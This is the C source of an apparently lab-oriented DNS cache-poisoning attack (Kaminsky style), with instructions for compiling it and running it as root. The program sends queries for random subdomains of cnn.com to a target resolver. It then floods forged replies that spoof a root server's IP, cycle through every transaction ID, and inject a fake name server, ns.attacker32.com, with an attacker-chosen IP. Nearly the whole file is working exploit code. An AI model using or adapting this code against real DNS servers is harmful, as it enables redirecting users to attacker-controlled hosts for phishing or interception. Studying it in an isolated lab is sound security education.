// ----attack.c------
// This sample program must be run by root lol! 
// 
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets.
//
// Compile command:
// # gcc -lpcap attack.c -o attack
// Launch the attack:
// # sudo ./attack attacker_ip dnsserver_ip
//
// 

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#include <time.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
     
// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader {
	unsigned char      iph_ihl:4, iph_ver:4;
	unsigned char      iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
//    unsigned char      iph_flag;
	unsigned short int iph_offset;
	unsigned char      iph_ttl;
	unsigned char      iph_protocol;
	unsigned short int iph_chksum;
	unsigned int       iph_sourceip;
	unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
	unsigned short int udph_srcport;
	unsigned short int udph_destport;
	unsigned short int udph_len;
	unsigned short int udph_chksum;
};

struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
	unsigned short int  type;
	unsigned short int  class;
};

struct datalen{
	unsigned short int ttl1,ttl2;
	unsigned short int len;
};

struct root{
	unsigned short int  type;
	unsigned short int v1,v2,v3;
};
// total udp header length: 8 bytes (=64 bits)

void delay(int number_of_seconds) 
{ 
    // Converting time into milli_seconds 
    int milli_seconds = 1000 * number_of_seconds; 
  
    // Stroing start time 
    clock_t start_time = clock(); 
  
    // looping till required time is not achieved 
    while (clock() < start_time + milli_seconds) 
        ; 
} 

unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
		cksum+=*usBuff++;
        }
	if(isize==1){
		cksum+=*(uint16_t *)usBuff;
        }

	return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
        unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);
	sum+=ntohs(IPPROTO_UDP+len);
	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);
	return (uint16_t)(~sum);
}

// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for(sum=0; nwords>0; nwords--)
		sum += *buf++;
		sum = (sum >> 16) + (sum &0xffff);
		sum += (sum >> 16);
		return (unsigned short)(~sum);
}

int main(int argc, char *argv[])
{
// This is to check the argc number
    if(argc != 3){
    	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
    	exit(-1);
    }

// socket descriptor
    int sd;
// buffer to hold the packet
    char buffer[PCKT_LEN];
    char send_buf[PCKT_LEN];

// set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);
    memset(send_buf, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    struct ipheader *ip2 = (struct ipheader *) send_buf;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct udpheader *udp2 = (struct udpheader *) (send_buf + sizeof(struct ipheader));
/* dns represents our response. */
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
/* dns2 represent our requests. */
    struct dnsheader *dns2=(struct dnsheader*) (send_buf +sizeof(struct ipheader)+sizeof(struct udpheader));
// data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
    char *data_send=(send_buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

////////////////////////////////////////////////////////////////////////
// This is for SEND DNS REQUSET
// dns fields(UDP payload field)
// relate to the lab, you can change them. begin:
////////////////////////////////////////////////////////////////////////

//The flag you need to set
/* set its flag to Q, indicating this is a query. */
    dns2->flags=htons(FLAG_Q);
//only 1 query, so the count should be one.
    dns2->QDCOUNT=htons(1);

//query string
    strcpy(data_send,"\5aaaaa\3cnn\3com");
    int length_send= strlen(data_send)+1;

// this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end_send=(struct dataEnd *)(data_send+length_send);
    end_send->type=htons(1);
    end_send->class=htons(1);

/////////////////////////////////////////////////////////////////////
//
// DNS format, relate to the lab, you need to change them, end
//
//////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////
// This is for FAKE RESPONSE DNS    
// dns fields(UDP payload field)
// relate to the lab, you can change them. begin:
////////////////////////////////////////////////////////////////////////

//The flag you need to set
/* set its flag to R, indicating this is a response. */
    dns->flags=htons(FLAG_R);
//only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);
    dns->ANCOUNT=htons(1);
    dns->NSCOUNT=htons(1);
    dns->ARCOUNT=htons(2);

//query string
    strcpy(data,"\5aaaaa\3cnn\3com");
    int length= strlen(data)+1;

//answer string
// this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);
    length+=4;
    strcpy(data+length,"\xc0\x0c");
    //type + class
    length+=2;
    struct dataEnd * end1=(struct dataEnd *)(data+length);
    end1->type=htons(1);
    end1->class=htons(1);
    length+=4;
    //datalen + ttl
   
    struct datalen * len1=(struct datalen *)(data+length);
    len1->ttl1=htons(1);
    len1->ttl2=htons(1);
    len1->len=htons(4);
    length+=6;
    /* address, whatever IP address we map aaaaa.cnn.com to, is not important... */
    strcpy(data+length,"\1\1\1\1");
    length+=4;
    //Authority query
    strcpy(data+length,"\xc0\x12");
    length+=2;
    //type + class
    struct dataEnd * end2=(struct dataEnd *)(data+length);
    end2->type=htons(2);
    end2->class=htons(1);
    length+=4;
    //datalen + ttl
    struct datalen * len2=(struct datalen *)(data+length);
    len2->ttl1=htons(1);
    len2->ttl2=htons(1);
    len2->len=htons(28);
    length+=6;
    //fake name server
    // ns.attacker32.com. \2ns, here 2 means ns is 2 characters; \3com means com is 3 characters. this is escape sequence: \nnn, in which nnn is oct format, and thus 12 is decimal 10.
    strcpy(data+length,"\2ns\12attacker32\3com");
    length+=19; // 2+10+3=15, 15+4=19, not sure why we need to add 4...
    //addition 
    strcpy(data+length,"\2ns\12attacker32\3com");
    length+=19; // 2+10+3=15, 15+4=19, not sure why we need to add 4...
    struct dataEnd * end3=(struct dataEnd *)(data+length);
    end3->type=htons(1);
    end3->class=htons(1);
    length+=4;
    struct datalen * len3=(struct datalen *)(data+length);
    len3->ttl1=htons(1);
    len3->ttl2=htons(1);
    len3->len=htons(4);
    length+=6;
	/* octal to decimal: \204\262\343\12 = 132.178.227.10 - which was yellowstone's ip address back then... */
	/* \254\20\115\202 = 172.16.77.130 */
    strcpy(data+length,"\254\20\115\202");
    //Root
    length+=5;
    struct dataEnd * end4=(struct dataEnd *)(data+length);
    end4->type=htons(41);
    end4->class=htons(4096);
    length+=6;
    struct dataEnd * end5=(struct dataEnd *)(data+length);
    end5->type=htons(34816);
    end5->class=htons(0);

/////////////////////////////////////////////////////////////////////
//
// DNS format, relate to the lab, you need to change them, end
//
//////////////////////////////////////////////////////////////////////

/*************************************************************************************
Construction of the packet is done. 
now focus on how to do the settings and send the packet we have composed out
***************************************************************************************/
// Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    srand(time(NULL));
    dns->query_id=rand(); // transaction ID for the query packet, use random #
    dns2->query_id=rand();

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 ) // if socket fails to be created 
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr("198.41.0.4");

    // The destination IP address - this should be the local DNS server's IP address, we are trying to poison this one.
    ip->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(53);//40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved

    // Destination port number
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));

    // This is configue for send packet
    // standard header structures but assign our own values.
    ip2->iph_ihl = 5;
    ip2->iph_ver = 4;
    ip2->iph_tos = 0; // Low delay
    unsigned short int packetLength_send =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length_send+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip2->iph_len=htons(packetLength_send);
    ip2->iph_ident = htons(rand()); // we give a random number for the identification#
    ip2->iph_ttl = 110; // hops
    ip2->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip2->iph_sourceip = inet_addr(argv[1]);
    // The destination IP address
    ip2->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp2->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved

    // Destination port number
    udp2->udph_destport = htons(53);
    udp2->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length_send+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
    // Calculate the checksum for integrity//
    ip2->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp2->udph_chksum=check_udp_sum(buffer, packetLength_send-sizeof(struct ipheader));
/*******************************************************************************
Tips

the checksum is quite important to pass the checking integrity. You need 
to study the algorithem and what part should be taken into the calculation.

!!!!!If you change anything related to the calculation of the checksum, you need to re-
calculate it or the packet will be dropped.!!!!!

Here things became easier since I wrote the checksum function for you. You don't need
to spend your time writing the right checksum function.
Just for knowledge purpose,
remember the seconed parameter
for UDP checksum:
ipheader_size + udpheader_size + udpData_size  
for IP checksum: 
ipheader_size + udpheader_size
*********************************************************************************/
    // Inform the kernel do not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
	printf("error\n");	
	exit(-1);
    }

// int ci=10;
    while(1){
// This is to generate different query in xxxxx.cnn.com
	int charnumber;
	/* charnumber is 1 to 5?? */
	charnumber=1+rand()%5;
	/* data_send at first is "aaaaa.cnn.com" */
        *(data_send+charnumber)+=1;
	/* data at first is also "aaaaa.cnn.com" */
	*(data+charnumber)+=1;

        //send request:
        udp2->udph_chksum=check_udp_sum(send_buf, packetLength_send-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
        // send the packet out.
        if(sendto(sd, send_buf, packetLength_send, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        printf("packet send error %d which means %s\n",errno,strerror(errno));
//	printf("delay...\n");
	delay(3000);
//	printf("delay done, now send fake responses.\n");
        //send fake response
        unsigned short int co=65535;
	/* we go from 65535 to 1, enumerate each transaction id. can't be zero? */
        while(co--){
            dns->query_id=co; // transaction ID for the query packet, use random #
            udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
        // send the packet out.
            if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
	
    }
    close(sd);
    return 0;
}
